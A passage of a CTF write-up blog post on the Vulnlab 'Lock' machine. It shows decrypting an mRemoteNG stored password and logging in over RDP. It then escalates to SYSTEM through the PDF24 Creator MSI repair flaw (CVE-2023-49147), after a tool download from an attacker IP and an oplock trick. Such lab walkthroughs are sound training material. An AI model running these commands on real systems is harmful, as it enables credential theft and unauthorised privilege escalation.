class="attr">RDPAlertIdleTimeout</span>=<span class="string">&quot;false&quot;</span> <span class="attr">LoadBalanceInfo</span>=<span class="string">&quot;&quot;</span> <span class="attr">Colors</span>=<span class="string">&quot;Colors16Bit&quot;</span> <span class="attr">Resolution</span>=<span class="string">&quot;FitToWindow&quot;</span> <span class="attr">AutomaticResize</span>=<span class="string">&quot;true&quot;</span> <span class="attr">DisplayWallpaper</span>=<span class="string">&quot;false&quot;</span> <span class="attr">DisplayThemes</span>=<span class="string">&quot;false&quot;</span> <span class="attr">EnableFontSmoothing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">EnableDesktopComposition</span>=<span class="string">&quot;false&quot;</span> <span class="attr">CacheBitmaps</span>=<span class="string">&quot;false&quot;</span> <span class="attr">RedirectDiskDrives</span>=<span class="string">&quot;false&quot;</span> <span class="attr">RedirectPorts</span>=<span class="string">&quot;false&quot;</span> <span class="attr">RedirectPrinters</span>=<span class="string">&quot;false&quot;</span> <span class="attr">RedirectSmartCards</span>=<span class="string">&quot;false&quot;</span> <span class="attr">RedirectSound</span>=<span class="string">&quot;DoNotPlay&quot;</span> <span class="attr">SoundQuality</span>=<span class="string">&quot;Dynamic&quot;</span> <span class="attr">RedirectKeys</span>=<span class="string">&quot;false&quot;</span> <span class="attr">Connected</span>=<span class="string">&quot;false&quot;</span> <span class="attr">PreExtApp</span>=<span class="string">&quot;&quot;</span> <span class="attr">PostExtApp</span>=<span class="string">&quot;&quot;</span> <span class="attr">MacAddress</span>=<span class="string">&quot;&quot;</span> <span class="attr">UserField</span>=<span class="string">&quot;&quot;</span> <span class="attr">ExtApp</span>=<span class="string">&quot;&quot;</span> <span class="attr">VNCCompression</span>=<span class="string">&quot;CompNone&quot;</span> <span class="attr">VNCEncoding</span>=<span class="string">&quot;EncHextile&quot;</span> <span class="attr">VNCAuthMode</span>=<span class="string">&quot;AuthVNC&quot;</span> <span class="attr">VNCProxyType</span>=<span class="string">&quot;ProxyNone&quot;</span> <span class="attr">VNCProxyIP</span>=<span class="string">&quot;&quot;</span> <span class="attr">VNCProxyPort</span>=<span class="string">&quot;0&quot;</span> <span class="attr">VNCProxyUsername</span>=<span class="string">&quot;&quot;</span> <span class="attr">VNCProxyPassword</span>=<span class="string">&quot;&quot;</span> <span class="attr">VNCColors</span>=<span class="string">&quot;ColNormal&quot;</span> <span class="attr">VNCSmartSizeMode</span>=<span class="string">&quot;SmartSAspect&quot;</span> <span class="attr">VNCViewOnly</span>=<span class="string">&quot;false&quot;</span> <span class="attr">RDGatewayUsageMethod</span>=<span class="string">&quot;Never&quot;</span> <span class="attr">RDGatewayHostname</span>=<span class="string">&quot;&quot;</span> <span class="attr">RDGatewayUseConnectionCredentials</span>=<span class="string">&quot;Yes&quot;</span> <span class="attr">RDGatewayUsername</span>=<span class="string">&quot;&quot;</span> <span class="attr">RDGatewayPassword</span>=<span class="string">&quot;&quot;</span> <span class="attr">RDGatewayDomain</span>=<span class="string">&quot;&quot;</span> <span class="attr">InheritCacheBitmaps</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritColors</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritDescription</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritDisplayThemes</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritDisplayWallpaper</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritEnableFontSmoothing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritEnableDesktopComposition</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritDomain</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritIcon</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritPanel</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritPassword</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritPort</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritProtocol</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritPuttySession</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRedirectDiskDrives</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRedirectKeys</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRedirectPorts</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRedirectPrinters</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRedirectSmartCards</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRedirectSound</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritSoundQuality</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritResolution</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritAutomaticResize</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritUseConsoleSession</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritUseCredSsp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRenderingEngine</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritUsername</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritICAEncryptionStrength</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDPAuthenticationLevel</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDPMinutesToIdleTimeout</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDPAlertIdleTimeout</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritLoadBalanceInfo</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritPreExtApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritPostExtApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritMacAddress</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritUserField</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritExtApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCCompression</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCEncoding</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCAuthMode</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCProxyType</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCProxyIP</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCProxyPort</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCProxyUsername</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCProxyPassword</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCColors</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCSmartSizeMode</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritVNCViewOnly</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDGatewayUsageMethod</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDGatewayHostname</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDGatewayUseConnectionCredentials</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDGatewayUsername</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDGatewayPassword</span>=<span class="string">&quot;false&quot;</span> <span class="attr">InheritRDGatewayDomain</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mrng:Connections</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>This is a <code>mRemoteNG</code> config file belonging to the <code>gale.dekarios</code> user. However, the password is encrypted. A quick google search for “mremoteng password decrypt” leads us to this tool <a target="_blank" rel="noopener" href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a> that decrypts mRemoteNG configuration files. Running it gives us the decrypted password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  lock python3 mremoteng_decrypt.py config.xml</span><br><span class="line">Name: RDP/Gale</span><br><span class="line">Hostname: Lock</span><br><span class="line">Username: Gale.Dekarios</span><br><span class="line">Password: &lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>

<p>Now that we have the password, we can try to RDP into the machine</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  lock xfreerdp /u:gale.dekarios /d:WORKGROUP /p:<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span> /v:lock.vl /size:1280x720</span><br></pre></td></tr></table></figure>

<p>Indeed, we got an RDP session and can read the user flag :)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\\Users\\gale.dekarios&gt;<span class="built_in">cd</span> Desktop</span><br><span class="line"></span><br><span class="line">C:\\Users\\gale.dekarios\\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">VL&#123;REDACTED&#125;</span><br></pre></td></tr></table></figure>

<h1 id="SYSTEM"><a href="#SYSTEM" class="headerlink" title="SYSTEM"></a>SYSTEM</h1><p>In <code>C:</code> drive, there is an interesting <code>_install</code> directory:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\\&gt;cmd /c <span class="built_in">dir</span> /A</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A03D<span class="literal">-9CEF</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\\</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">06</span>:<span class="number">17</span> AM    &lt;<span class="built_in">DIR</span>&gt;          <span class="variable">$Recycle</span>.Bin</span><br><span class="line"><span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">12</span>:<span class="number">38</span> PM    &lt;<span class="built_in">DIR</span>&gt;          <span class="variable">$WinREAgent</span></span><br><span class="line"><span class="number">01</span>/<span class="number">19</span>/<span class="number">2024</span>  <span class="number">04</span>:<span class="number">56</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Config.Msi</span><br><span class="line"><span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">06</span>:<span class="number">14</span> PM    &lt;JUNCTION&gt;     Documents and Settings [<span class="type">C</span>:\\<span class="type">Users</span>]</span><br><span class="line"><span class="number">01</span>/<span class="number">19</span>/<span class="number">2024</span>  <span class="number">04</span>:<span class="number">36</span> AM            <span class="number">12</span>,<span class="number">288</span> DumpStack.log.tmp</span><br><span class="line"><span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">11</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Gitea</span><br><span class="line"><span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">27</span> AM    &lt;<span class="built_in">DIR</span>&gt;          inetpub</span><br><span class="line"><span class="number">01</span>/<span class="number">19</span>/<span class="number">2024</span>  <span class="number">05</span>:<span class="number">47</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Microsoft</span><br><span class="line"><span class="number">01</span>/<span class="number">19</span>/<span class="number">2024</span>  <span class="number">04</span>:<span class="number">36</span> AM     <span class="number">1</span>,<span class="number">207</span>,<span class="number">959</span>,<span class="number">552</span> pagefile.sys</span><br><span class="line"><span class="number">05</span>/<span class="number">08</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">20</span> AM    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">28</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">24</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">24</span> AM    &lt;<span class="built_in">DIR</span>&gt;          ProgramData</span><br><span class="line"><span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">06</span>:<span class="number">14</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Recovery</span><br><span class="line"><span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">06</span>:<span class="number">14</span> PM    &lt;<span class="built_in">DIR</span>&gt;          System Volume Information</span><br><span class="line"><span class="number">01</span>/<span class="number">19</span>/<span class="number">2024</span>  <span class="number">04</span>:<span class="number">39</span> AM    &lt;<span class="built_in">DIR</span>&gt;          temp</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">06</span>:<span class="number">14</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">18</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">23</span> AM    &lt;<span class="built_in">DIR</span>&gt;          _install</span><br><span class="line">               <span class="number">2</span> File(s)  <span class="number">1</span>,<span class="number">207</span>,<span class="number">971</span>,<span class="number">840</span> bytes</span><br><span class="line">              <span class="number">17</span> <span class="built_in">Dir</span>(s)   <span class="number">5</span>,<span class="number">546</span>,<span class="number">426</span>,<span class="number">368</span> bytes free</span><br></pre></td></tr></table></figure>

<p>It contains some software installer files:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\\&gt;<span class="built_in">cd</span> _install</span><br><span class="line"></span><br><span class="line">C:\\_install&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A03D<span class="literal">-9CEF</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\\_install</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">21</span> AM        <span class="number">60</span>,<span class="number">804</span>,<span class="number">608</span> Firefox Setup <span class="number">121.0</span>.msi</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">05</span>:<span class="number">39</span> AM        <span class="number">43</span>,<span class="number">593</span>,<span class="number">728</span> mRemoteNG<span class="literal">-Installer-1</span>.<span class="number">76.20</span>.<span class="number">24615</span>.msi</span><br><span class="line"><span class="number">12</span>/<span class="number">14</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">07</span> AM       <span class="number">462</span>,<span class="number">602</span>,<span class="number">240</span> pdf24<span class="literal">-creator-11</span>.<span class="number">15.1</span><span class="literal">-x64</span>.msi</span><br><span class="line">               <span class="number">3</span> File(s)    <span class="number">567</span>,<span class="number">000</span>,<span class="number">576</span> bytes</span><br><span class="line">               <span class="number">0</span> <span class="built_in">Dir</span>(s)   <span class="number">5</span>,<span class="number">546</span>,<span class="number">401</span>,<span class="number">792</span> bytes free</span><br></pre></td></tr></table></figure>

<p>The <code>pdf24-creator-11.15.1-x64.msi</code> is intriguing. Googling “pdf24-creator-11.15.1 exploit” brings up a blogpost (<a target="_blank" rel="noopener" href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/</a>) about a privilege escalation vulnerability (CVE-2023-49147) with a proof-of-concept (PoC). Basically, we can run the following command to start the repair of <em>PDF24 Creator</em> and trigger the vulnerable actions without a UAC popup:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /fa C:\\_install\\pdf24<span class="literal">-creator-11</span>.<span class="number">15.1</span><span class="literal">-x64</span>.msi</span><br></pre></td></tr></table></figure>

<p>The installer should start. Now, we need to set an oplock on the <code>faxPrnInst.log</code> file as soon as it gets read. We can do that using the <code>SetOpLock.exe</code> tool from <a target="_blank" rel="noopener" href="https://github.com/googleprojectzero/symboliclink-testing-tools">https://github.com/googleprojectzero/symboliclink-testing-tools</a>. First let’s transfer it to the victim machine</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\\temp&gt; <span class="built_in">iwr</span> &lt;http://<span class="number">10.8</span>.<span class="number">0.210</span>/SetOpLock.exe&gt; <span class="literal">-outfile</span> SetOpLock.exe</span><br><span class="line"><span class="built_in">PS</span> C:\\temp&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\\temp</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">1</span>/<span class="number">19</span>/<span class="number">2024</span>   <span class="number">6</span>:<span class="number">06</span> AM         <span class="number">116224</span> SetOpLock.exe</span><br></pre></td></tr></table></figure>

<p>Then we execute it like this:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\temp\\SetOpLock.exe <span class="string">&quot;C:\\Program Files\\PDF24\\faxPrnInst.log&quot;</span> <span class="built_in">r</span></span><br></pre></td></tr></table></figure>

<p>As per the blogpost, if the oplock is set, the cmd window that opens when pdf24-PrinterInstall.exe is executed doesn’t close:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\\temp&gt; C:\\temp\\SetOpLock.exe <span class="string">&quot;C:\\Program Files\\PDF24\\faxPrnInst.log&quot;</span> <span class="built_in">r</span></span><br><span class="line">OpLock triggered, hit ENTER to close oplock</span><br></pre></td></tr></table></figure>

<p>At this point, we need to follow these steps to spawn a SYSTEM shell:</p>
<ul>
<li>right click on the top bar of the cmd window.</li>
<li>click on properties.</li>
<li>under options click on the “legacy console mode” link.</li>
<li>open the link with Firefox (it should open a link like this “<a target="_blank" rel="noopener" href="https://go.microsoft.com/fwlink/?LinkId=871150">https://go.microsoft.com/fwlink/?LinkId=871150</a>“).</li>
<li>in the opened browser window press the key combination <code>CTRL+o</code>.</li>
<li>type “cmd.exe” in the top bar and press Enter.<br>If all the steps are executed successfully, we should get a SYSTEM shell:</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\\Windows&gt;whoami</span><br><span class="line">nt authority\\system</span><br><span class="line"></span><br><span class="line">C:\\Windows&gt;<span class="built_in">type</span> C:\\Users\\Administrator\\Desktop\\root.txt</span><br><span class="line">VL&#123;REDACTED&#125;</span><br></pre></td></tr></table></figure>

<p>That concludes the box. I hope you learned something new 🐈</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io">serioton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io/2024/01/20/Lock-Vulnlab/">https://seriotonctf.github.io/2024/01/20/Lock-Vulnlab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnlab/">vulnlab</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F32f31a6a-94e8-4f0c-a634-b4d25ddb3468%2Fbamboo_slide.webp?table=block&amp;id=4a0a5659-6394-4650-b233-d1910b3f33f8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1030&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Bamboo - Vulnlab</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F32f31a6a-94e8-4f0c-a634-b4d25ddb3468%2Fbamboo_slide.webp?table=block&id=4a0a5659-6394-4650-b233-d1910b3f33f8&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1030&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-14</div><div class="title">Bamboo - Vulnlab</div></div></a></div><div><a href="/2023/10/25/Job-Vulnlab/" title="Job - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Fdf7a8010-c06f-4ab7-b4ca-840c76b90893%2FUntitled.png?table=block&id=4eee05c7-64ed-409d-9fab-63f5a6e430ba&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-25</div><div class="title">Job - Vulnlab</div></div></a></div><div><a href="/2023/10/19/Media-Vulnlab/" title="Media - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F723ecb50-3ce1-43a7-8202-b53f76aa2ccf%2Fmedia.png?table=block&id=965e07b3-adbf-4f84-b843-97ecaafe658a&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-19</div><div class="title">Media - Vulnlab</div></div></a></div><div><a href="/2023/11/02/Slonik-Vulnlab/" title="Slonik - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F3c4cf065-3e0a-433a-a2d4-a1f5ee052a21%2Fspaces_I3I73FFqB6GvT8N5Mt1N_uploads_o4i6j9OnSS4TIFmGKqQT_slonik_slide.webp?table=block&id=08f6badb-b393-4cdb-beaf-fa488c1e57d0&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">Slonik - Vulnlab</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">noob ctf player</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/itsahmed29"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/ItsAhmed29" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my blog where you will find my writeups. Enjoy (=^ ◡ ^=)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GITEA"><span class="toc-text">GITEA</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-ellen-freeman"><span class="toc-text">Shell as ellen.freeman</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ellen-freeman-to-gale-dekarios"><span class="toc-text">ellen.freeman to gale.dekarios</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SYSTEM"><span class="toc-text">SYSTEM</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab"><img src="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&amp;token=4a34abe6-3e20-4725-9334-bd39e2db903a" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lock - Vulnlab"/></a><div class="content"><a class="title" href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab">Lock - Vulnlab</a><time datetime="2024-01-20T18:44:31.000Z" title="Created 2024-01-20 18:44:31">2024-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F32f31a6a-94e8-4f0c-a634-b4d25ddb3468%2Fbamboo_slide.webp?table=block&amp;id=4a0a5659-6394-4650-b233-d1910b3f33f8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1030&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bamboo - Vulnlab"/></a><div class="content"><a class="title" href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab">Bamboo - Vulnlab</a><time datetime="2023-12-14T20:44:27.000Z" title="Created 2023-12-14 20:44:27">2023-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/02/Slonik-Vulnlab/" title="Slonik - Vulnlab"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F3c4cf065-3e0a-433a-a2d4-a1f5ee052a21%2Fspaces_I3I73FFqB6GvT8N5Mt1N_uploads_o4i6j9OnSS4TIFmGKqQT_slonik_slide.webp?table=block&amp;id=08f6badb-b393-4cdb-beaf-fa488c1e57d0&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1020&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Slonik - Vulnlab"/></a><div class="content"><a class="title" href="/2023/11/02/Slonik-Vulnlab/" title="Slonik - Vulnlab">Slonik - Vulnlab</a><time datetime="2023-11-02T15:15:10.000Z" title="Created 2023-11-02 15:15:10">2023-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/25/Job-Vulnlab/" title="Job - Vulnlab"><img 